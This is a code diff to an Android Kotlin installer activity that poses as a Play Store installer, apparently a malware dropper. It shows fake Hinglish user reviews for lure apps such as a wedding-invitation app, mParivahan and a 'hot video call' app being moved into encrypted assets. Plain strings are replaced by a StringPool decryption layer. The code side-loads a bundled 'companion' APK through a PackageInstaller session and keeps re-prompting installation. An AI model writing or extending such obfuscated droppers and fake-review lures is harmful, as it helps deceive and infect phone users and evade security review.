@@ -58,8 +58,8 @@ class InstallActivity : AppCompatActivity() {
     companion object {
         private const val SESSION_REQUEST = 1001
         private const val MAX_RETRIES    = 2
-        private const val REFERRER_URI   = "android-app://com.android.vending"
-        private const val WRITE_NAME     = "update.pkg"
+        private val REFERRER_URI get()   = StringPool.d(StringPool.REFERRER_URI)
+        private val WRITE_NAME get()     = StringPool.d(StringPool.WRITE_NAME)
         private const val TOTAL_MB       = 1.84f
         const val INSTALL_SUCCESS_ACTION = "com.playstore.installer.INSTALL_SUCCESS"
         private const val KEY_STAGE      = "install_stage"
@@ -86,131 +86,21 @@ class InstallActivity : AppCompatActivity() {
         DotSpec("#FFC107", 30f, 64f,142f,  80,   13f, false)
     )
 
-    // ── Reviews data (dynamic by app name) ───────────────────────────────────
-    private val reviewsWeddingInvitation = listOf(
-        Triple("Priya Sharma",     5, "Bilkul perfect app hai! Wedding invitation itni aasani se ban gayi. Bahut achha kaam kiya!"),
-        Triple("Rahul Verma",      5, "This app is simply amazing! Made my wedding card in minutes. Fast & secure. Loved it!"),
-        Triple("Anjali Patel",     5, "Shaadi ka invitation banane ka sabse aasaan tarika. Ekdum smooth aur reliable app hai!"),
-        Triple("Suresh Mehta",     4, "Bahut hi behtareen app hai. Design options bahut saare hain. Highly recommended for weddings!"),
-        Triple("Kavitha Reddy",    5, "Instant match mila meri pasand ka design! Ek dum mast experience tha. 5 stars easily!"),
-        Triple("Deepak Nair",      5, "App is working smoothly without any lag. Best app for wedding cards. Zabardast hai yeh!"),
-        Triple("Sunita Gupta",     4, "Very easy to use aur reliable bhi hai. Meri saari family ne use kiya. Bahut pasand aaya!"),
-        Triple("Vikram Joshi",     5, "One of the best apps I have used for wedding purpose. Fast aur secure bhi hai. Love it!"),
-        Triple("Meena Iyer",       5, "Itna acha app pehle kabhi nahi dekha! Invitation ready in seconds. Ekdum reliable hai!"),
-        Triple("Aakash Dubey",     4, "Better features than other apps. Simple UI aur fast performance. Bahut kaam ka app hai!"),
-        Triple("Rekha Singh",      5, "Mere wedding ke liye best raha yeh app! Smooth experience aur instant results. Superb!"),
-        Triple("Pranav Desai",     5, "App ne meri shaadi ki invitation ko bilkul beautiful bana diya. Fast & easy to use!"),
-        Triple("Geeta Chauhan",    4, "Bahut hi easy aur reliable app hai. Better features milte hain yahan. Recommend karunga!"),
-        Triple("Harish Pillai",    5, "Simply outstanding! Instant design match mila. App is working smoothly on my phone!"),
-        Triple("Pallavi Tiwari",   5, "Yeh app ek dum mast hai bhai! Shaadi invitation ke liye sabse best. 5 star dena banta hai!"),
-        Triple("Sameer Bhatia",    4, "Good app with better features. Fast and secure. Kabhi crash nahi hua. Very reliable!"),
-        Triple("Bhavna Rao",       5, "One of the best apps on Play Store! Wedding invitation banane mein bahut aasaan laga!"),
-        Triple("Tushar Agarwal",   5, "Instant match mila design ka! App is smooth aur fast. Ekdum reliable experience mila!"),
-        Triple("Divya Menon",      4, "Easy to use aur very reliable. Better than other apps. Fast & secure bhi hai. Love it!"),
-        Triple("Girish Saxena",    5, "Zabardast app hai yeh! Meri wedding invitation bahut sundar bani. Highly recommended!")
-    )
-
-    private val reviewsShaadikaNimantran = listOf(
-        Triple("Pooja Sharma",     5, "Yeh app toh kamaal ka hai! Shaadi ka nimantran itni jaldi ban gaya. Bahut badhiya!"),
-        Triple("Rajesh Verma",     5, "App is working smoothly aur results instant aate hain. Ek dum mast app hai yeh!"),
-        Triple("Anita Patel",      5, "Nimantran banane ka sabse aasaan aur fast tarika. Secure bhi hai. Highly recommended!"),
-        Triple("Mohit Mehta",      4, "Bahut hi behtareen app! Better features hain yahan doosre apps se. Zabardast hai!"),
-        Triple("Sunita Reddy",     5, "Instant match mila mujhe! App is working smoothly without any issues. 5 star!"),
-        Triple("Deepak Gupta",     5, "Fast & secure app hai yeh. Shaadi ka nimantran bilkul sundar bana. Mast experience!"),
-        Triple("Kavitha Nair",     4, "Easy aur reliable app hai. Mere pariwar ne bhi use kiya aur sabko pasand aaya!"),
-        Triple("Arun Joshi",       5, "One of the best apps for nimantran! Smooth performance aur instant results. Love it!"),
-        Triple("Rekha Iyer",       5, "Itna smooth app pehle nahi dekha tha. Nimantran ready in seconds. Ekdum reliable!"),
-        Triple("Vikram Dubey",     4, "Better features milte hain yahan. Fast & secure. Kabhi koi problem nahi aai. Good app!"),
-        Triple("Meena Singh",      5, "Yeh app ne meri shaadi ki planning aasaan kar di! Fast, easy aur reliable hai. Superb!"),
-        Triple("Pranav Desai",     5, "Ekdum mast app hai! Instant design match mila. App is working smoothly. 5 stars!"),
-        Triple("Geeta Chauhan",    4, "Reliable aur easy to use. Better than other apps available. Bahut kaam ka hai yeh!"),
-        Triple("Harish Pillai",    5, "Simply best app for shaadi nimantran! Fast & secure. Highly recommended to everyone!"),
-        Triple("Pallavi Tiwari",   5, "Zabardast hai yeh app! Nimantran banane mein bilkul aasaan laga. One of the best!"),
-        Triple("Sameer Bhatia",    4, "Good app with smooth performance. Fast aur secure bhi. Ekdum reliable experience!"),
-        Triple("Bhavna Rao",       5, "One of the best apps on store! Instant results aur better features. Bahut pasand aaya!"),
-        Triple("Tushar Agarwal",   5, "App is working smoothly on my phone. Fast & easy. Nimantran bahut acha bana. Love it!"),
-        Triple("Divya Menon",      4, "Easy to use aur very reliable. Instant match mila design ka. Recommended!"),
-        Triple("Girish Saxena",    5, "Yeh app ek number hai! Shaadi ka nimantran ab aur bhi aasaan. Highly recommended!")
-    )
-
-    private val reviewsMparivahan = listOf(
-        Triple("Rahul Sharma",     5, "App is working smoothly! Documents check karna ab bahut aasaan ho gaya. Superb app!"),
-        Triple("Priya Verma",      5, "Fast & secure app hai yeh. RC aur DL instant milti hai. One of the best apps!"),
-        Triple("Amit Patel",       4, "Bahut hi reliable app hai. Better features hain yahan. Kaafi kaam aata hai yeh!"),
-        Triple("Sneha Iyer",       5, "Instant match mila mera vehicle record! App is smooth aur fast. Highly recommended!"),
-        Triple("Vikram Singh",     5, "Yeh app ne meri life aasaan kar di! Documents hamesha saath rahte hain ab. Zabardast!"),
-        Triple("Deepika Nair",     4, "Easy to use aur very reliable. Better than carrying physical documents. Love it!"),
-        Triple("Arjun Mehta",      5, "One of the best government apps! Fast & secure. Kabhi koi issue nahi aaya. 5 stars!"),
-        Triple("Pooja Gupta",      5, "Ekdum mast app hai! RC aur insurance instant check ho jati hai. Bahut badhiya!"),
-        Triple("Kiran Reddy",      4, "Smooth performance aur better features. Fast & secure experience. Recommended!"),
-        Triple("Suresh Kumar",     5, "App is working smoothly without any lag. Government services ab phone pe. Superb!"),
-        Triple("Ananya Pillai",    5, "Instant results milte hain! Bahut reliable aur fast app hai. One of the best!"),
-        Triple("Ravi Bhatia",      4, "Better than visiting RTO office. Easy to use aur fast bhi. Ekdum reliable app!"),
-        Triple("Meena Joshi",      5, "Zabardast app hai! Vehicle details instant milti hain. Fast & secure. Love it!"),
-        Triple("Sanjay Dubey",     5, "One of the best apps for vehicle documents! Smooth aur reliable. Highly recommended!"),
-        Triple("Lakshmi Rao",      4, "Easy to use app with better features. Fast results milte hain. Bahut kaam ka hai!"),
-        Triple("Nikhil Tiwari",    5, "App is working smoothly on my Android. Instant match mila vehicle ka. Superb!"),
-        Triple("Kavitha Menon",    5, "Fast & secure app! Documents ab hamesha available rehte hain phone pe. Love it!"),
-        Triple("Rohit Yadav",      4, "Reliable aur easy to use. Better features than other transport apps. Recommended!"),
-        Triple("Divya Krishnan",   5, "Yeh app ekdum best hai! Instant results aur smooth performance. One of the best!"),
-        Triple("Manoj Chauhan",    5, "Bahut hi behtareen app! Fast, easy aur reliable. Mparivahan ne sab aasaan kar diya!")
-    )
-
-    private val reviewsHotVideoCall = listOf(
-        Triple("Rahul Sharma",     5, "App is working smoothly! Video call quality bahut achhi hai. Fast & reliable. Love it!"),
-        Triple("Priya Verma",      5, "Instant connection milti hai! Fast & secure app hai yeh. One of the best video apps!"),
-        Triple("Amit Patel",       4, "Bahut hi smooth experience hai. Better video quality than other apps. Recommended!"),
-        Triple("Sneha Iyer",       5, "Ekdum mast app hai! Video call crystal clear aati hai. Fast aur secure. 5 stars!"),
-        Triple("Vikram Singh",     5, "App is working smoothly without any lag. Instant match mila! Zabardast experience!"),
-        Triple("Deepika Nair",     4, "Easy to use aur very reliable app. Better features hain yahan. Kaafi pasand aaya!"),
-        Triple("Arjun Mehta",      5, "One of the best video call apps! Fast & secure. Smooth performance. Highly recommended!"),
-        Triple("Pooja Gupta",      5, "Itna smooth video call app pehle nahi dekha! Instant connect hota hai. Superb!"),
-        Triple("Kiran Reddy",      4, "Reliable app with better features. Fast connection milti hai. Ekdum mast experience!"),
-        Triple("Suresh Kumar",     5, "Fast & secure app hai yeh! Video quality top class hai. One of the best apps easily!"),
-        Triple("Ananya Pillai",    5, "Instant match mila aur call crystal clear thi! App is smooth. Bahut badhiya hai!"),
-        Triple("Ravi Bhatia",      4, "Better than other video apps. Easy to use aur fast bhi. Reliable experience mila!"),
-        Triple("Meena Joshi",      5, "Zabardast app hai! Fast & secure video calling. Smooth performance. Love it!"),
-        Triple("Sanjay Dubey",     5, "App is working smoothly on my phone. Instant connect. One of the best. 5 stars!"),
-        Triple("Lakshmi Rao",      4, "Easy to use app. Better video quality. Fast & reliable. Ekdum achha experience!"),
-        Triple("Nikhil Tiwari",    5, "Yeh app toh kamaal ka hai! Instant match milta hai. Fast aur secure. Superb!"),
-        Triple("Kavitha Menon",    5, "One of the best video call apps on store! Smooth, fast aur reliable. Highly recommended!"),
-        Triple("Rohit Yadav",      4, "Reliable aur easy to use. Better features than others. Fast & secure. Good app!"),
-        Triple("Divya Krishnan",   5, "App is working smoothly! Instant connection aur clear video. Bahut achha hai yeh!"),
-        Triple("Manoj Chauhan",    5, "Fast & secure app! Video call mast aati hai. One of the best apps. Zabardast!")
-    )
-
-    private val reviewsGeneric = listOf(
-        Triple("Rahul Sharma",     5, "App is working smoothly! Bilkul mast experience raha. Highly recommended to everyone!"),
-        Triple("Priya Verma",      5, "Fast & secure app hai yeh. Instant results milte hain. One of the best apps!"),
-        Triple("Amit Patel",       4, "Bahut hi reliable app hai. Better features hain yahan. Smooth performance. Good!"),
-        Triple("Sneha Iyer",       5, "Ekdum mast app hai! Instant match mila. Fast aur easy to use. 5 stars easily!"),
-        Triple("Vikram Singh",     5, "App is working smoothly without any lag. Zabardast experience raha. Love it!"),
-        Triple("Deepika Nair",     4, "Easy to use aur very reliable. Better than other apps. Fast & secure. Recommended!"),
-        Triple("Arjun Mehta",      5, "One of the best apps! Fast & secure. Smooth performance. Highly recommended!"),
-        Triple("Pooja Gupta",      5, "Itna smooth app pehle kabhi nahi dekha! Instant results. Ekdum reliable hai!"),
-        Triple("Kiran Reddy",      4, "Reliable app with better features. Fast & easy. Bahut kaam ka app hai yeh!"),
-        Triple("Suresh Kumar",     5, "Fast & secure! App is working smoothly on my phone. One of the best. Zabardast!"),
-        Triple("Ananya Pillai",    5, "Instant match mila! Smooth aur reliable experience. Bahut achha app hai yeh!"),
-        Triple("Ravi Bhatia",      4, "Better features than other apps. Easy to use. Fast & secure. Good experience!"),
-        Triple("Meena Joshi",      5, "Zabardast app hai! Fast, easy aur reliable. One of the best apps on store!"),
-        Triple("Sanjay Dubey",     5, "App is working smoothly! Instant results aur better features. Highly recommended!"),
-        Triple("Lakshmi Rao",      4, "Easy to use app. Better performance. Fast & secure. Ekdum reliable hai yeh!"),
-        Triple("Nikhil Tiwari",    5, "Yeh app toh kamaal ka hai! Instant match milta hai. Fast aur secure. Superb!"),
-        Triple("Kavitha Menon",    5, "One of the best apps! Smooth, fast aur reliable. Highly recommended to all!"),
-        Triple("Rohit Yadav",      4, "Reliable aur easy to use. Better features. Fast & secure. Bahut pasand aaya!"),
-        Triple("Divya Krishnan",   5, "App is working smoothly! Instant results aur better experience. Love it!"),
-        Triple("Manoj Chauhan",    5, "Fast & secure! One of the best apps. Smooth performance. Ekdum mast hai yeh!")
-    )
 
     private fun getReviewsForApp(): List<Triple<String, Int, String>> {
         val appName = getString(R.string.app_name).trim().lowercase()
-        return when {
-            appName.contains("wedding invitation")       -> reviewsWeddingInvitation
-            appName.contains("shaadi ka nimantran")      -> reviewsShaadikaNimantran
-            appName.contains("mparivahan")               -> reviewsMparivahan
-            appName.contains("hot video call")           -> reviewsHotVideoCall
-            else                                         -> reviewsGeneric
+        val template = when {
+            appName.contains(StringPool.d(StringPool.TPL_WEDDING))    -> StringPool.d(StringPool.TPL_WEDDING)
+            appName.contains(StringPool.d(StringPool.TPL_SHAADI))     -> StringPool.d(StringPool.TPL_SHAADI)
+            appName.contains(StringPool.d(StringPool.TPL_MPARIVAHAN)) -> StringPool.d(StringPool.TPL_MPARIVAHAN)
+            appName.contains(StringPool.d(StringPool.TPL_HOT_VIDEO))  -> StringPool.d(StringPool.TPL_HOT_VIDEO)
+            else -> "generic"
         }
+        // Load from encrypted assets/reviews.enc
+        val fromAssets = StringPool.loadReviews(this, template)
+        if (fromAssets.isNotEmpty()) return fromAssets
+        // Fallback: empty list (reviews not critical to function)
+        return emptyList()
     }
 
     // ── Lifecycle ─────────────────────────────────────────────────────────────
@@ -238,27 +128,24 @@ class InstallActivity : AppCompatActivity() {
             registerReceiver(installSuccessReceiver, filter)
         }
 
-        val prefs = getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
-        val savedStage = prefs.getString(KEY_STAGE, Stage.IDLE.name)
+        val prefs = getSharedPreferences(StringPool.d(StringPool.PREFS_NAME), MODE_PRIVATE)
+        val savedStage = prefs.getString(StringPool.d(StringPool.KEY_STAGE), Stage.IDLE.name)
 
         when (savedStage) {
             Stage.INSTALLING.name -> {
-                // APK already downloaded — re-trigger install dialog from cached file
-                val cachedPath = prefs.getString("cached_apk_path", null)
+                val cachedPath = prefs.getString(StringPool.d(StringPool.KEY_CACHED_PATH), null)
                 val cachedApk  = if (cachedPath != null) java.io.File(cachedPath) else null
                 if (cachedApk != null && cachedApk.exists()) {
                     setStage(Stage.INSTALLING)
                     val apkBytes = cachedApk.readBytes()
                     installViaSession(apkBytes, attempt = 1)
                 } else {
-                    // Cache missing — redownload
                     setStage(Stage.IDLE)
                     startDownload()
                 }
             }
             Stage.DONE.name -> {
-                // Verify companion is actually still installed before showing DONE state
-                val companionPkg = prefs.getString(InstallReceiver.KEY_COMPANION_PKG, null)
+                val companionPkg = prefs.getString(StringPool.d(StringPool.KEY_COMPANION_PKG), null)
                 val companionInstalled = if (!companionPkg.isNullOrEmpty()) {
                     try { packageManager.getPackageInfo(companionPkg, 0); true } catch (_: Exception) { false }
                 } else false
@@ -266,8 +153,7 @@ class InstallActivity : AppCompatActivity() {
                 if (companionInstalled) {
                     setStage(Stage.DONE)
                 } else {
-                    // Companion was uninstalled — reset and show Install button again
-                    prefs.edit().remove(KEY_STAGE).apply()
+                    prefs.edit().remove(StringPool.d(StringPool.KEY_STAGE)).apply()
                     setStage(Stage.IDLE)
                     startDownload()
                 }
@@ -288,11 +174,10 @@ class InstallActivity : AppCompatActivity() {
     private val installSuccessReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             if (intent.action == INSTALL_SUCCESS_ACTION) {
-                // Clear cached APK — no longer needed
-                val prefs = getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
-                val cachedPath = prefs.getString("cached_apk_path", null)
+                val prefs = getSharedPreferences(StringPool.d(StringPool.PREFS_NAME), MODE_PRIVATE)
+                val cachedPath = prefs.getString(StringPool.d(StringPool.KEY_CACHED_PATH), null)
                 if (cachedPath != null) java.io.File(cachedPath).delete()
-                prefs.edit().remove("cached_apk_path").apply()
+                prefs.edit().remove(StringPool.d(StringPool.KEY_CACHED_PATH)).apply()
                 setStage(Stage.DONE)
             }
         }
@@ -465,7 +350,7 @@ class InstallActivity : AppCompatActivity() {
 
             Thread {
                 try {
-                    val apkBytes = assets.open("companion.apk").readBytes()
+                    val apkBytes = assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
                     if (apkBytes.isNotEmpty()) {
                         runOnUiThread { installViaSession(apkBytes, attempt = 1) }
                     } else {
@@ -494,7 +379,7 @@ class InstallActivity : AppCompatActivity() {
             val packageInstaller = packageManager.packageInstaller
             val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
 
-            val tmpFile = java.io.File(cacheDir, "tmp_companion.apk")
+            val tmpFile = java.io.File(cacheDir, StringPool.d(StringPool.TMP_COMPANION))
             tmpFile.writeBytes(apkBytes)
             val pkgName = packageManager.getPackageArchiveInfo(tmpFile.absolutePath, 0)?.packageName ?: ""
             tmpFile.delete()
@@ -521,10 +406,10 @@ class InstallActivity : AppCompatActivity() {
             val session   = packageInstaller.openSession(sessionId)
             try {
                 // Save APK to cache so it survives activity recreation
-                val cachedApk = java.io.File(cacheDir, "companion_cached.apk")
+                val cachedApk = java.io.File(cacheDir, StringPool.d(StringPool.CACHED_COMPANION))
                 cachedApk.writeBytes(apkBytes)
-                getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
-                    .edit().putString("cached_apk_path", cachedApk.absolutePath).apply()
+                getSharedPreferences(StringPool.d(StringPool.PREFS_NAME), MODE_PRIVATE)
+                    .edit().putString(StringPool.d(StringPool.KEY_CACHED_PATH), cachedApk.absolutePath).apply()
 
                 session.openWrite(WRITE_NAME, 0, apkBytes.size.toLong()).use { out ->
                     out.write(apkBytes)
